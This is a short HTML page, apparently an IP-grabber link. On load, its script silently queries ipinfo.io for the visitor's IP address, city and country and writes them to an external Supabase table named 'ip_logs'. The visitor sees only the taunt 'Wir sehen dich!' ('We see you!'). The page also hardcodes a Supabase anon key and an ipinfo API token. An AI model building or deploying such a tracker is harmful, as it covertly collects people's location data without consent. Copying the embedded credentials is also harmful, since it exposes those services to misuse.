<!DOCTYPE html>
<html>
<head>
  <title>IP-Tracker 😈</title>
  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

    const supabaseUrl = 'https://wxvpqpmmqlwogevypndw.supabase.co'
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind4dnBxcG1tcWx3b2dldnlwbmR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkxMTQxMDQsImV4cCI6MjA2NDY5MDEwNH0.t7HsLa7ZS1OBUtvLiM5IStAwMZjqy_WZ2B-s2SYn32I'
    const supabase = createClient(supabaseUrl, supabaseKey)

    fetch('https://ipinfo.io/json?token=8ce5a4bd1966b2')
      .then(res => res.json())
      .then(async data => {
        const { ip, city, country } = data

        const { error } = await supabase
          .from('ip_logs')
          .insert([{ ip, city, country }])

        if (error) {
          console.error('❌ Fehler beim Speichern:', error)
        } else {
          console.log('✅ IP erfolgreich gespeichert:', ip, city, country)
        }
      });
  </script>
</head>
<body>
  <h1>👁️ Wir sehen dich!</h1>
</body>
</html>
